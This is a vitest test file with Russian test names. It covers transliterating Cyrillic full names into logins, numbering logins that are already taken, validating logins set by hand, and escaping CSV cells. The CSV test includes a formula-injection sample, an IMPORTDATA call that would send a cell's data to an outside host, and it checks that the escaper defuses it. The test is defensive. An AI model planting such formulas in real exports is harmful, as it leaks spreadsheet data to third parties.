import { describe, expect, it } from "vitest";
import { baseLogin, freeLogin, loginProblem } from "@/lib/login/logins";
import { csvCell } from "@/lib/csv";

describe("логины вида amuradyan (этап 52)", () => {
  it("первая буква имени и фамилия латиницей из ФИО «Фамилия Имя Отчество»", () => {
    expect(baseLogin("Мурадян Арам")).toBe("amuradyan");
    expect(baseLogin("Головкин Владислав Сергеевич")).toBe("vgolovkin");
    expect(baseLogin("Хадыров Равшан")).toBe("rkhadyrov");
    expect(baseLogin("Щукина Юлия")).toBe("yshchukina");
    expect(baseLogin("Ёлкин Эдуард")).toBe("eelkin");
  });

  it("одно слово, дефисы, пометки в скобках и латиница", () => {
    expect(baseLogin("Алсу")).toBe("alsu");
    expect(baseLogin("Петрова-Водкина Анна")).toBe("apetrovavodkina");
    expect(baseLogin("Иванов Иван (пример)")).toBe("iivanov");
    expect(baseLogin("Smith John")).toBe("jsmith");
    expect(baseLogin("  ")).toBe("user");
  });

  it("занятый логин получает номер, длина не больше 30", () => {
    const taken = new Set(["amuradyan", "amuradyan2"]);
    expect(freeLogin("amuradyan", (x) => taken.has(x))).toBe("amuradyan3");
    expect(freeLogin("treva", () => false)).toBe("treva");
    const long = "a".repeat(30);
    expect(freeLogin(long, (x) => x === long)).toHaveLength(30);
  });

  it("логин, который владелец задаёт руками", () => {
    expect(loginProblem("amuradyan")).toBeNull();
    expect(loginProblem("a.muradyan-2")).toBeNull();
    expect(loginProblem("Amuradyan")).not.toBeNull();
    expect(loginProblem("1abc")).not.toBeNull();
    expect(loginProblem("a")).not.toBeNull();
    expect(loginProblem("мурадян")).not.toBeNull();
  });
});

describe("после проверки кода этапа 52", () => {
  it("логин не короче двух букв, казахские и узбекские буквы не теряются", () => {
    expect(baseLogin("Я")).toBe("ya");
    expect(baseLogin("Ы")).toBe("yuser");
    expect(baseLogin("Әлиев Қанат")).toBe("kaliev");
    expect(baseLogin("Ғаниев Ўктам")).toBe("uganiev");
    expect(loginProblem(baseLogin("Ы"))).toBeNull();
  });

  it("ячейка CSV не превращается в формулу", () => {
    expect(csvCell("Рева Тарас")).toBe('"Рева Тарас"');
    expect(csvCell('=IMPORTDATA("https://x/?"&D3)')).toBe(`"'=IMPORTDATA(""https://x/?""&D3)"`);
    expect(csvCell("+7 999")).toBe(`"'+7 999"`);
    expect(csvCell("-1")).toBe(`"'-1"`);
    expect(csvCell("@cmd")).toBe(`"'@cmd"`);
    expect(csvCell(null)).toBe('""');
  });
});
